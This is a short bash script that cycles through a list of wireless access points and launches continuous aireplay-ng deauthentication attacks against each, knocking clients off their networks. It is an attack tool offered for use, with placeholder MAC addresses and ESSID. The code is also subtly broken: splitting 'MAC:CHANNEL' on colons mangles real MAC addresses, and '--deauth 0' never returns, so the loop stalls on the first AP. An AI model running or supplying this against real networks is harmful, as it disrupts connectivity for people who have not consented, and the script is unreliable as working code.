#!/bin/bash

# List of APs and their channels
ap_list=("AP1_MAC_ADDRESS:CHANNEL1" "AP2_MAC_ADDRESS:CHANNEL2" "AP3_MAC_ADDRESS:CHANNEL3")

# Wireless interface
iface="wlan0mon"

# Iterate through the list
for ap in "${ap_list[@]}"; do
    # Extract MAC address and channel from the list
    mac_address=$(echo "$ap" | cut -d":" -f1)
    channel=$(echo "$ap" | cut -d":" -f2)

    # Set the wireless interface to the specified channel
    iwconfig $iface channel $channel

    # Launch deauthentication attack
    aireplay-ng --deauth 0 -a $mac_address -c [CLIENT_MAC_ADDRESS] -e [ESSID] $iface

    # Sleep for a few seconds before moving to the next AP
    sleep 5
done

